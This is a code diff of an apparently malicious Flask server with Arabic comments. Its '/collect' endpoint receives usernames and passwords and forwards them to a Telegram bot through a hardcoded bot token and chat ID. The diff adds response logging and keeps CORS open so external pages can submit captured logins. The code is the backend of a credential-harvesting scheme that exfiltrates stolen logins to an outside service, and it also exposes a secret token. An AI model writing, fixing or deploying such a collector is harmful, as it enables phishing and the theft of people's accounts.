@@ -4,8 +4,9 @@ import os
 import requests
 
 app = Flask(__name__)
-CORS(app)  # تفعيل الـ CORS عشان يمنع أي حظر من المتصفح أو Vercel
+CORS(app)
 
+# بيانات بوت تليجرام والـ Chat ID بتاعك
 TELEGRAM_BOT_TOKEN = "9249129764:AAEz54D8XAUW9Puc-WKZCtH68RQ1No7M6gl"
 CHAT_ID = "6032043580"
 
@@ -14,13 +15,13 @@ def send_to_telegram(username, password):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message}
     try:
-        requests.post(url, json=payload)
+        response = requests.post(url, json=payload)
+        print("Telegram Response:", response.text)
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error sending to telegram: {e}")
 
 @app.route('/collect', methods=['POST', 'OPTIONS'])
 def collect():
-    # التعامل مع طلبات الـ OPTIONS الخاصة بالـ CORS
     if request.method == 'OPTIONS':
         return jsonify({"status": "ok"}), 200
 
